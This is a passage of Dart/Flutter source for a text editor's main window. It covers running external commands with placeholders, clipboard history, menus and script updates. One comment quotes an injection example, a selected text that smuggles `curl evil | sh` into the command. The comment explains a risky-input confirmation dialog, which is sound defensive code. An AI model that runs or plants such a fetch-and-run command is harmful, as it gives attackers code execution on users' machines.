  }

  // ── run (external commands): dialog input or a saved command → expand the
  // $(...) placeholders → execute; with output capture the result is shown in
  // the bottom output panel, otherwise the process is run detached (GUI programs). ──
  late final RunStore _runStore = RunStore();
  List<RunCommand> _runCommands = const [];
  bool _runPanelOpen = false;
  double _runPanelHeight = 200;
  String _runOutput = '';
  bool _runBusy = false;

  Future<void> _loadRunCommands() async {
    final cmds = await _runStore.load();
    if (mounted) setState(() => _runCommands = cmds);
  }

  Future<void> _saveRunCommands(List<RunCommand> cmds) async {
    try {
      await _runStore.save(cmds);
    } catch (e) {
      Log.instance.w('run commands save failed: $e');
    }
    if (mounted) setState(() => _runCommands = List.of(cmds));
  }

  // Only the placeholders [command] uses are read from the document: the
  // caret line (capped in the editor) and the selection are document reads
  // that no command without those placeholders should pay for.
  Future<RunContext> _runContext(String command) async {
    final a = _active;
    if (a == null) return const RunContext();
    final wantWord = usesRunPlaceholder(command, r'$(CURRENT_WORD)');
    final wantLine =
        usesRunPlaceholder(command, r'$(CURRENT_LINE)') ||
        usesRunPlaceholder(command, r'$(CURRENT_LINE_NUMBER)');
    final sel = a.selection;
    var selText = '';
    if (wantWord && sel != null && sel.$2 - sel.$1 <= 64 * 1024) {
      selText = await a.readDecoded(sel.$1, sel.$2 - sel.$1) ?? '';
    }
    final (line, lineNo) = wantLine ? await a.currentLine() : ('', 0);
    return RunContext(
      path: a.path,
      currentWord: wantWord ? await a.currentWord() : '',
      currentLine: line,
      selection: selText,
      lineNumber: lineNo,
    );
  }

  // Document text goes into the command unquoted (Notepad++ semantics), so
  // a selection like `x"; curl evil | sh; echo "` in a file someone sent
  // would run as commands. Values with shell metacharacters need an explicit
  // OK, with the expanded command shown.
  Future<bool> _confirmRiskyRun(RunContext ctx, String expanded) async {
    final risky = <String>[
      if (ctx.selection.isNotEmpty) ctx.selection else ctx.currentWord,
      ctx.currentLine,
    ].any(shellRiskyValue);
    if (!risky) return true;
    final l10n = AppLocalizations.of(context);
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text(l10n.tr('run_risky_title')),
        content: SingleChildScrollView(
          child: Text('${l10n.tr('run_risky_body')}\n\n$expanded'),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(ctx).pop(false),
            child: Text(l10n.tr('common_cancel')),
          ),
          FilledButton(
            onPressed: () => Navigator.of(ctx).pop(true),
            child: Text(l10n.tr('run_risky_go')),
          ),
        ],
      ),
    );
    return ok == true && mounted;
  }

  Future<void> _runPrompt() async {
    final r = await showRunDialog(context);
    if (r == null || !mounted) return;
    if (r.saveAs != null) {
      final list = [
        for (final c in _runCommands)
          if (c.name != r.saveAs) c,
        RunCommand(r.saveAs!, r.command, capture: r.capture),
      ];
      await _saveRunCommands(list);
    }
    await _execute(RunCommand(r.saveAs ?? '', r.command, capture: r.capture));
  }

  void _runNamed(String name) {
    for (final c in _runCommands) {
      if (c.name == name) {
        _execute(c);
        return;
      }
    }
    _snack(AppLocalizations.of(context).trf('run_not_found', [name]));
  }

  Future<void> _manageRunCommands() => showRunManageDialog(
    context,
    commands: _runCommands,
    onSave: _saveRunCommands,
    onRun: _execute,
  );

  Future<void> _execute(RunCommand cmd) async {
    if (_runBusy) return;
    final l10n = AppLocalizations.of(context);
    final ctx = await _runContext(cmd.command);
    final expanded = expandRunPlaceholders(cmd.command, ctx);
    if (!await _confirmRiskyRun(ctx, expanded)) return;
    final cwd = ctx.path == null ? null : File(ctx.path!).parent.path;
    if (!cmd.capture) {
      try {
        await runExternalCommand(
          expanded,
          capture: false,
          workingDirectory: cwd,
        );
        _snack(l10n.trf('run_started', [expanded]));
      } catch (e) {
        _snack(l10n.trf('run_failed', [e.toString()]));
      }
      return;
    }
    setState(() {
      _runBusy = true;
      _runPanelOpen = true;
      _runOutput = '> $expanded\n';
    });
    try {
      final res = await runExternalCommand(
        expanded,
        capture: true,
        workingDirectory: cwd,
      );
      if (!mounted) return;
      setState(() {
        _runOutput += res.output;
        if (!_runOutput.endsWith('\n')) _runOutput += '\n';
        _runOutput += l10n.trf('run_exit_code', [res.exitCode]);
      });
    } catch (e) {
      if (mounted) {
        setState(() => _runOutput += l10n.trf('run_failed', [e.toString()]));
      }
    } finally {
      if (mounted) setState(() => _runBusy = false);
    }
  }

  Widget _runOutputPanel() {
    final l10n = AppLocalizations.of(context);
    return Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        MouseRegion(
          cursor: SystemMouseCursors.resizeRow,
          child: GestureDetector(
            behavior: HitTestBehavior.opaque,
            onVerticalDragUpdate: (d) => setState(() {
              final maxH = MediaQuery.of(context).size.height - 200;
              _runPanelHeight = (_runPanelHeight - d.delta.dy).clamp(
                80.0,
                maxH < 80.0 ? 80.0 : maxH,
              );
            }),
            child: Container(
              height: 6,
              color: _barBg,
              alignment: Alignment.center,
              child: Container(
                width: 48,
                height: 2,
                color: _barFg.withValues(alpha: 0.4),
              ),
            ),
          ),
        ),
        SizedBox(
          height: _runPanelHeight,
          child: Column(
            children: [
              Container(
                color: _barBg,
                padding: const EdgeInsets.only(left: 8),
                child: Row(
                  children: [
                    Icon(Icons.terminal, size: 16, color: _barFg),
                    const SizedBox(width: 6),
                    Expanded(
                      child: Text(
                        _runBusy
                            ? l10n.tr('run_running')
                            : l10n.tr('run_output'),
                        style: TextStyle(color: _barFg, fontSize: 12),
                      ),
                    ),
                    IconButton(
                      tooltip: l10n.tr('common_close'),
                      icon: Icon(Icons.close, size: 16, color: _barFg),
                      onPressed: () => setState(() => _runPanelOpen = false),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: Container(
                  width: double.infinity,
                  color: Theme.of(context).colorScheme.surface,
                  child: SingleChildScrollView(
                    padding: const EdgeInsets.all(6),
                    child: SelectableText(
                      _runOutput,
                      style: const TextStyle(
                        fontFamily: 'monospace',
                        fontSize: 12,
                      ),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  List<Widget> _runItems() {
    final l10n = AppLocalizations.of(context);
    return [
      if (_runCommands.isEmpty)
        MenuItemButton(onPressed: null, child: Text(l10n.tr('run_none')))
      else
        for (final c in _runCommands)
          MenuItemButton(
            leadingIcon: const Icon(Icons.play_arrow, size: 18),
            onPressed: _runBusy ? null : () => _execute(c),
            child: Text(c.name),
          ),
    ];
  }

  // ── clipboard history (Edit → Clipboard History..., ctrl+shift+v): what was
  // copied/cut in this run plus the system clipboard captured when the window
  // gains focus; picking an entry = paste it and put it back on the system clipboard. ──
  Future<void> _captureClipboard() async {
    try {
      final d = await Clipboard.getData(Clipboard.kTextPlain);
      final t = d?.text;
      if (t != null) ClipboardHistory.instance.add(t);
    } catch (_) {}
  }

  Future<void> _openClipboardHistory() async {
    await _captureClipboard();
    if (!mounted) return;
    final l10n = AppLocalizations.of(context);
    final items = ClipboardHistory.instance.items;
    final picked = await showDialog<String>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text(l10n.tr('clip_title')),
        content: ResizableDialogBox(
          id: 'clipboardHistory',
          initialWidth: 520,
          initialHeight: 360,
          child: items.isEmpty
              ? Text(l10n.tr('clip_none'))
              : ListView.builder(
                  itemCount: items.length,
                  itemBuilder: (ctx, i) {
                    final t = items[i];
                    final preview = t.length > 200 ? t.substring(0, 200) : t;
                    return ListTile(
                      dense: true,
                      leading: Text('${i + 1}'),
                      title: Text(
                        preview.replaceAll('\n', '⏎ '),
                        maxLines: 2,
                        overflow: TextOverflow.ellipsis,
                        style: const TextStyle(
                          fontFamily: 'monospace',
                          fontSize: 12,
                        ),
                      ),
                      subtitle: Text(l10n.trf('clip_chars', [t.length])),
                      onTap: () => Navigator.pop(ctx, t),
                    );
                  },
                ),
        ),
        actions: [
          TextButton(
            onPressed: () {
              ClipboardHistory.instance.clear();
              Navigator.pop(ctx);
            },
            child: Text(l10n.tr('clip_clear')),
          ),
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: Text(l10n.tr('common_cancel')),
          ),
        ],
      ),
    );
    if (picked == null || !mounted) return;
    ClipboardHistory.instance.add(picked);
    await Clipboard.setData(ClipboardData(text: picked));
    final a = _active;
    if (a != null && a.hasDoc && a.viewMode != ViewMode.hex) {
      a.insertText(picked);
      a.focusEditor();
    }
  }

  // ── column editor (Edit → Column Editor..., alt+c) ────────────
  Future<void> _openColumnEditor() async {
    final a = _active;
    if (a == null || !a.hasDoc || a.viewMode == ViewMode.hex) return;
    final spec = await showColumnEditorDialog(context);
    if (spec == null || !mounted) return;
    a.applyColumnEditor(spec);
    a.focusEditor();
  }

  List<Widget> _macroItems() {
    final l10n = AppLocalizations.of(context);
    final canRun =
        _active != null && _active!.hasDoc && _active!.viewMode != ViewMode.hex;
    return [
      if (_macroNames.isEmpty)
        MenuItemButton(onPressed: null, child: Text(l10n.tr('macros_none')))
      else
        for (final n in _macroNames)
          MenuItemButton(
            leadingIcon: const Icon(Icons.play_arrow, size: 18),
            onPressed: canRun ? () => _runSavedMacro(n) : null,
            child: Text(n),
          ),
    ];
  }

  // "Recent Files": AppSettings.recentFiles (newest first, de-duplicated, max
  // 10); clicking opens the file (already open → jump to its tab); clicking a
  // file that no longer exists removes it from the list.
  List<Widget> _recentItems() {
    final l10n = AppLocalizations.of(context);
    final files = AppSettings.instance.recentFiles;
    return [
      if (files.isEmpty)
        MenuItemButton(onPressed: null, child: Text(l10n.tr('recent_none')))
      else ...[
        for (var i = 0; i < files.length; i++)
          MenuItemButton(
            onPressed: () => _openRecentFile(files[i]),
            child: ConstrainedBox(
              constraints: const BoxConstraints(maxWidth: 480),
              child: Text(
                '${i + 1}.  ${files[i]}',
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ),
        const Divider(height: 8),
        MenuItemButton(
          leadingIcon: const Icon(Icons.delete_outline, size: 18),
          onPressed: () {
            AppSettings.instance.recentFiles.clear();
            AppSettings.instance.save();
            if (mounted) setState(() {});
          },
          child: Text(l10n.tr('recent_clear')),
        ),
      ],
    ];
  }

  // "Syntax": manually pick the active file's highlight language (auto / each
  // WASM language / plain text). With no file open (active==null) the items
  // are disabled.
  List<Widget> _syntaxItems(EditorController? active) {
    final l10n = AppLocalizations.of(context);
    // "Auto" names what it actually resolved to for the active file, so the
    // user can tell which grammar (or none) is in effect without guessing.
    String autoLabel() {
      if (active == null || !active.hasDoc || active.syntaxMode != 'auto') {
        return l10n.tr('syntax_auto');
      }
      final eff = active.effectiveSyntax ?? l10n.tr('syntax_plain');
      return l10n.trf('syntax_auto_using', [eff]);
    }

    final options = <(String, String)>[
      ('auto', autoLabel()),
      for (final l in WasmGrammarRegistry.instance.languages) (l, l),
      ('plain', l10n.tr('syntax_plain')),
    ];
    return [
      for (final (mode, label) in options)
        MenuItemButton(
          leadingIcon: active?.syntaxMode == mode
              ? const Icon(Icons.check, size: 18)
              : const SizedBox(width: 18),
          onPressed: active == null ? null : () => active.setSyntax(mode),
          child: Text(label),
        ),
    ];
  }

  // "Encoding": force how the active file's bytes are interpreted
  // (reinterpret), the BOM toggle, and convert-and-save. When a unit-based
  // encoding (UTF-16/32) is picked but not yet supported, EditorView shows a notice.
  List<Widget> _encodingItems(EditorController? active) {
    final l10n = AppLocalizations.of(context);
    final current = active?.encodingName;
    return [
      for (final (group, codecs) in textCodecMenuGroups)
        SubmenuButton(
          menuChildren: [
            for (final c in codecs)
              MenuItemButton(
                leadingIcon: current == c.name
                    ? const Icon(Icons.check, size: 18)
                    : const SizedBox(width: 18),
                onPressed: active == null
                    ? null
                    : () => active.setEncoding(c.name),
                child: Text(c.name),
              ),
          ],
          child: Text(l10n.tr('enc_group_$group')),
        ),
      const Divider(height: 8),
      // BOM as an undoable edit at offset 0 (enabled for encodings that can
      // represent U+FEFF).
      MenuItemButton(
        leadingIcon: (active?.hasBom ?? false)
            ? const Icon(Icons.check, size: 18)
            : const SizedBox(width: 18),
        onPressed: (active?.bomPossible ?? false)
            ? () => active!.toggleBom()
            : null,
        child: const Text('BOM'),
      ),
      // Convert = really rewrite the bytes and save (with a confirm dialog in
      // the editor), unlike the reinterpret items above.
      SubmenuButton(
        menuChildren: [
          for (final (group, codecs) in textCodecMenuGroups)
            SubmenuButton(
              menuChildren: [
                for (final c in codecs)
                  MenuItemButton(
                    onPressed: active == null || current == c.name
                        ? null
                        : () => active.convertEncoding(c.name),
                    child: Text(c.name),
                  ),
              ],
              child: Text(l10n.tr('enc_group_$group')),
            ),
        ],
        child: Text(l10n.tr('enc_convert_save')),
      ),
    ];
  }

  // "Tools": user scripts (settings/scripts/*.js) — line-by-line text
  // transforms. Clicking a script runs it on the active file (or the lines
  // covered by its selection); hex mode is byte-oriented and not applicable.
  List<Widget> _scriptItems(EditorController? active) {
    final l10n = AppLocalizations.of(context);
    final names = UserScriptRegistry.instance.names;
    final canRun =
        active != null && active.hasDoc && active.viewMode != ViewMode.hex;
    return [
      if (names.isEmpty)
        MenuItemButton(onPressed: null, child: Text(l10n.tr('scripts_none')))
      else
        for (final n in names)
          MenuItemButton(
            leadingIcon: Icon(
              UserScriptRegistry.instance.engineFor(n) == ScriptEngine.lua
                  ? Icons.code
                  : Icons.javascript_outlined,
              size: 18,
            ),
            onPressed: canRun ? () => active.runScript(n) : null,
            // A built-in whose bundled version moved on while this copy is the
            // user's own: marked here so the notice cannot be missed.
            child: Text(_scriptHasUpdate(n) ? '$n ⚠' : n),
          ),
      const Divider(height: 8),
      if (scriptsWithNewVersion.isNotEmpty)
        MenuItemButton(
          leadingIcon: const Icon(Icons.system_update_alt, size: 18),
          onPressed: _openScriptUpdates,
          child: Text(
            l10n.trf('scripts_updates', ['${scriptsWithNewVersion.length}']),
          ),
        ),
      MenuItemButton(
        leadingIcon: const Icon(Icons.refresh, size: 18),
        onPressed: _reloadScripts,
        child: Text(l10n.tr('scripts_reload')),
      ),
      MenuItemButton(
        leadingIcon: const Icon(Icons.folder_open, size: 18),
        onPressed: _openScriptsFolder,
        child: Text(l10n.tr('scripts_open_folder')),
      ),
    ];
  }

  /// Whether [name] (a script's menu name, i.e. the file stem) has a parked
  /// `.new` waiting to be reconciled.
  bool _scriptHasUpdate(String name) =>
      scriptsWithNewVersion.any((f) => _scriptStem(f) == name);

  static String _scriptStem(String fileName) {
    final dot = fileName.lastIndexOf('.');
    return dot > 0 ? fileName.substring(0, dot) : fileName;
  }

  /// Tools → Script Updates...: what changed, and the three ways out of it.
  ///
  /// The user's script keeps running untouched; the new text sits beside it as
  /// `<name>.new`, and that file's existence *is* the pending state — resolving
  /// it (either way) removes the file and with it the notice.
  Future<void> _openScriptUpdates() async {
    final l10n = AppLocalizations.of(context);
    final sep = Platform.pathSeparator;
    await showDialog<void>(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setSt) => AlertDialog(
          title: Text(l10n.tr('scripts_updates_title')),
          content: ResizableDialogBox(
            id: 'scriptUpdates',
            initialWidth: 520,
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(l10n.tr('scripts_updates_help')),
                const SizedBox(height: 12),
                for (final f in [...scriptsWithNewVersion])
                  Padding(
                    padding: const EdgeInsets.symmetric(vertical: 4),
                    child: Row(
                      children: [
                        Expanded(child: Text(f)),
                        TextButton(
                          onPressed: () {
                            Navigator.pop(ctx);
                            _openDiffPane(
                              '$settingsDir${sep}scripts$sep$f',
                              '$settingsDir${sep}scripts$sep$f.new',
                            );
                          },
                          child: Text(l10n.tr('scripts_updates_diff')),
                        ),
                        TextButton(
                          onPressed: () async {
                            await _resolveScriptUpdate(f, adopt: true);
                            setSt(() {});
                            if (scriptsWithNewVersion.isEmpty &&
                                ctx.mounted) {
                              Navigator.pop(ctx);
                            }
                          },
                          child: Text(l10n.tr('scripts_updates_adopt')),
                        ),
                        TextButton(
                          onPressed: () async {
                            await _resolveScriptUpdate(f, adopt: false);
                            setSt(() {});
                            if (scriptsWithNewVersion.isEmpty &&
                                ctx.mounted) {
                              Navigator.pop(ctx);
                            }
                          },
                          child: Text(l10n.tr('scripts_updates_keep')),
                        ),
                      ],
                    ),
                  ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: _openScriptsFolder,
              child: Text(l10n.tr('scripts_open_folder')),
            ),
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: Text(l10n.tr('common_close')),
            ),
          ],
        ),
      ),
    );
    if (mounted) setState(() {});
  }

  /// Take the new version (keeping the user's as `.bak`) or discard it; either
  /// way the `.new` goes, which is what clears the notice.
  Future<void> _resolveScriptUpdate(String file, {required bool adopt}) async {
    final sep = Platform.pathSeparator;
    final dir = '$settingsDir${sep}scripts';
    final mine = File('$dir$sep$file');
    final side = File('$dir$sep$file.new');
    try {
      if (adopt) {
        if (await mine.exists()) await mine.copy('$dir$sep$file.bak');
        if (await side.exists()) await side.copy(mine.path);
        Log.instance.i('script update adopted: $file (previous kept as .bak)');
      } else {
        // Record the dismissed bundled version next to the seed copies, or
        // _seedScripts parks the same .new again on every launch.
        if (await side.exists()) {
          final mark = File('$dir$sep.seeded$sep$file.dismissed');
          await mark.parent.create(recursive: true);
          await side.copy(mark.path);
        }
        Log.instance.i('script update dismissed: $file');
      }
      if (await side.exists()) await side.delete();
    } catch (e) {
      Log.instance.w('script update ($file) failed: $e');
    }
    scriptsWithNewVersion = [
      for (final f in scriptsWithNewVersion)
        if (f != file) f,
    ];
    if (adopt) await _reloadScripts();
    if (mounted) setState(() {});
  }

  // Rescan + recompile settings/scripts/ without a restart (edits included:
  // re-registering replaces the source, worker threads rebuild lazily).
  Future<void> _reloadScripts() async {
    await UserScriptRegistry.instance.load();
    if (mounted) setState(() {});
  }

  // Open settings/scripts/ in the platform file manager (created on demand so
  // the very first visit lands in the right place, not an error dialog).
  void _openScriptsFolder() {
    final dir = Directory('$settingsDir${Platform.pathSeparator}scripts');
    try {
      dir.createSync(recursive: true);
      final opener = Platform.isWindows
          ? 'explorer.exe'
          : Platform.isMacOS
          ? 'open'
          : 'xdg-open';
      Process.start(opener, [dir.path], mode: ProcessStartMode.detached);
    } catch (e) {
      Log.instance.w('open scripts folder failed: ${dir.path} ($e)');
    }
  }

  @override
  void dispose() {
    HardwareKeyboard.instance.removeHandler(_onGlobalKey);
    _menuBarFocus.dispose();
    SingleInstance.current?.onArgs = null;
    MacFiles.onOpenFiles = null;
    _sessionDebounce?.cancel();
    _extCheckTimer?.cancel();
    _autoSaveTimer?.cancel();
    _macro.removeListener(_onMacroChanged);
    UserKeymap.instance.removeListener(_onUserKeymapChanged);
    windowManager.removeListener(this);
    _layout.removeListener(_scheduleSessionSave);
    for (final c in _controllers.values) {
      c.removeListener(_onEditorChanged);
      c.dispose();
    }
    AppSettings.instance.removeListener(_onSettingsChanged);
    _layout.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final active = _active;
    return Scaffold(
      appBar: AppBar(
        // Consistent with the editor: background/foreground both come from the
        // colour theme (otherwise light mode would draw white text on white).
        backgroundColor: _barBg,
        foregroundColor: _barFg,
        titleSpacing: 8,
        // Material's default 56px toolbar is a lot for a row of menu titles;
        // follow the menu row height (28 × uiScale) plus a little breathing
        // room, so the bar also scales with the UI text scale.
        toolbarHeight: AppSettings.instance.menuRowHeight + 8,
        // Top menubar: native MenuBar (structure defined by JSON, text localized via ARB).
        title: Row(
          children: [
            if (_menus.isNotEmpty)
              JsonMenuBar(
                menus: _menus,
                onAction: _onMenuAction,
                topLevelColor: _barFg, // match the AppBar foreground (white text is wrong on the light theme)
                isChecked: _menuChecked,
                // Syntax/encoding are dynamic placeholder nodes in the JSON;
                // their contents are generated here.
                dynamicChildren: _dynamicMenuChildren,
                shortcutOverride: _shortcutFor,
                firstMenuController: _menuBarCtl,
                firstMenuFocusNode: _menuBarFocus,
              ),
            // No file name here: the tab already shows it (with the ● and
            // saving markers).
            const Spacer(),
          ],
        ),
        // Donate entry (top-right). Hidden once the user says they donated
        // (honor system, persisted); Help → the donate item stays as the way
        // back in.
        actions: [
          // Macro recording indicator; click = stop recording.
          if (_macro.recording)
            TextButton.icon(
              onPressed: _toggleMacroRecord,
              icon: const Icon(
                Icons.fiber_manual_record,
                color: Colors.red,
                size: 16,
              ),
              label: Text(
                '${AppLocalizations.of(context).tr('macro_rec')} '
                '(${_macro.stepCount})',
                style: TextStyle(color: _barFg),
              ),
            ),
          if (!AppSettings.instance.donateHidden)
            IconButton(
              icon: const Icon(Icons.favorite_border),
              tooltip: AppLocalizations.of(context).tr('donate_tooltip'),
              onPressed: () => showDonateDialog(context),
            ),
        ],
        // The toolbar (settings/toolbar.json): common actions as icon
        // buttons; scrolls horizontally instead of overflowing.
        bottom: _toolbarItems.isEmpty
            ? null
            : PreferredSize(
                preferredSize: const Size.fromHeight(36),
                child: Container(
                  height: 36,
                  alignment: Alignment.centerLeft,
                  padding: const EdgeInsets.symmetric(horizontal: 8),
                  child: SingleChildScrollView(
                    scrollDirection: Axis.horizontal,
                    child: Row(children: _toolbarButtons()),
                  ),
                ),
              ),
      ),
      backgroundColor: _bodyBg,
      // root should never be null (startup and closing the last tab both add
      // an untitled document); if it ever is, only paint the background and
      // let the menubar open files.
      // Files dragged onto the window open as tabs (same flow as the command
      // line: jump when already open, skip what isn't a file). The overlay
      // gives drop feedback while a drag hovers.
      body: DropTarget(
        onDragEntered: (_) => setState(() => _dragHover = true),
        onDragExited: (_) => setState(() => _dragHover = false),
        onDragDone: (detail) {
          setState(() => _dragHover = false);
          _openCliPaths([for (final f in detail.files) f.path]);
          _bringToFront(); // drops don't activate the target window
        },
        child: Row(
          children: [
            if (AppSettings.instance.explorerOpen) _explorerSidebar(),
            Expanded(
              child: Column(
                children: [
                  Expanded(
                    child: Stack(
                      fit: StackFit.expand,
                      children: [
                        if (_layout.root != null)
                          Docking(
                            layout: _layout,
                            onItemSelection: (item) {
                              final id = item.id as int;
                              _setActive(id);
                              // Clicking a tab should leave the caret ready
                              // to type: focus once the pane is on stage.
                              WidgetsBinding.instance.addPostFrameCallback(
                                (_) => _controllers[id]?.focusEditor(),
                              );
                            },
                            itemCloseInterceptor: _itemCloseInterceptor,
                            onItemClose: _onItemClose,
                          ),
                        if (_dragHover)
                          IgnorePointer(
                            child: Container(
                              color: _barBg.withValues(alpha: 0.7),
                              alignment: Alignment.center,
                              child: Text(
                                AppLocalizations.of(
                                  context,
                                ).tr('drop_open_hint'),
                                style: TextStyle(fontSize: 20, color: _barFg),
                              ),
                            ),
                          ),
                      ],
                    ),
                  ),
                  if (_fifOpen) ...[
                    // Drag handle: resize the panel by its top edge.
                    MouseRegion(
                      cursor: SystemMouseCursors.resizeRow,
                      child: GestureDetector(
                        behavior: HitTestBehavior.opaque,
                        onVerticalDragUpdate: (d) => setState(() {
                          final maxH = MediaQuery.of(context).size.height - 200;
                          _fifHeight = (_fifHeight - d.delta.dy).clamp(
                            120.0,
                            maxH < 120.0 ? 120.0 : maxH,
                          );
                        }),
                        child: Container(
                          height: 6,
                          color: _barBg,
                          alignment: Alignment.center,
                          child: Container(
                            width: 48,
                            height: 2,
                            color: _barFg.withValues(alpha: 0.4),
                          ),
                        ),
                      ),
                    ),
                    SizedBox(
                      height: _fifHeight,
                      child: FindInFilesPanel(
                        key: _fifKey,
                        initialFolder: active?.path == null
                            ? ''
                            : File(active!.path!).parent.path,
                        onOpenMatch: _openFifMatch,
                        replaceInOpen: _replaceInOpenPane,
                        replaceFile: MacFiles.isActive
                            ? MacFiles.replaceItem
                            : null,
                        onClose: () {
                          setState(() => _fifOpen = false);
                          // Give the keyboard back to the editor.
                          WidgetsBinding.instance.addPostFrameCallback(
                            (_) => _active?.focusEditor(),
                          );
                        },
                      ),
                    ),
                  ],
                  if (_runPanelOpen) _runOutputPanel(),
                ],
              ),
            ),
            if (_bookmarkPanelOpen || _outlinePanelOpen) _rightSidebar(),
          ],
        ),
      ),
    );
  }
}

/// Pane ids in the layout string are the integer item ids.
class _SessionIdParser extends LayoutParser {
  const _SessionIdParser();

  @override
  String idToString(dynamic id) => id == null ? '' : '$id';

  @override
  dynamic stringToId(String id) => id.isEmpty ? null : int.tryParse(id);
}

/// Rebuilds panes while the docking layout string is parsed: known ids get
/// their session file back (with caret/encoding), unknown ids (files that
/// disappeared, or an untitled pane) become blank untitled documents.
class _SessionAreaBuilder with AreaBuilderMixin {
  _SessionAreaBuilder(this._state, this._files);

  final _LargeFileEditorPageState _state;
  final Map<int, SessionFile> _files;

  @override
  DockingItem buildDockingItem({
    required dynamic id,
    required double? weight,
    required bool maximized,
  }) {
    var iid = id is int ? id : (int.tryParse('$id') ?? -1);
    if (iid < 0) iid = _state._nextId;
    // Diff-pane ids (never persisted, dropped right after the load) must not
    // push the editor id counter into their range.
    if (iid >= _state._nextId && iid < _diffIdBase) _state._nextId = iid + 1;
    return _state._buildPaneItem(
      iid,
      _files[iid],
      weight: weight,
      maximized: maximized,
    );
  }
}

// docking 1.16's same-group tab drop (drop_item.dart) always decrements the
// drop index when the dragged tab comes from that group, which is only right
// when the tab moves rightwards (removing it shifts the target left). Moving
// a tab leftwards therefore landed one slot too far left (tab 3 dropped on
// tab 2 became tab 1). Compensate by passing index+1 in that case.
class _FixedDockingLayout extends DockingLayout {
  @override
  void moveItem({
    required DockingItem draggedItem,
    required DropArea targetArea,
    DropPosition? dropPosition,
    int? dropIndex,
  }) {
    var index = dropIndex;
    if (index != null && index > 0 && targetArea is DockingTabs) {
      var oldIndex = -1;
      for (var i = 0; i < targetArea.childrenCount; i++) {
        if (identical(targetArea.childAt(i), draggedItem)) oldIndex = i;
      }
      if (oldIndex > index) index++;
    }
    super.moveItem(
      draggedItem: draggedItem,
      targetArea: targetArea,
      dropPosition: dropPosition,
      dropIndex: index,
    );
  }
}
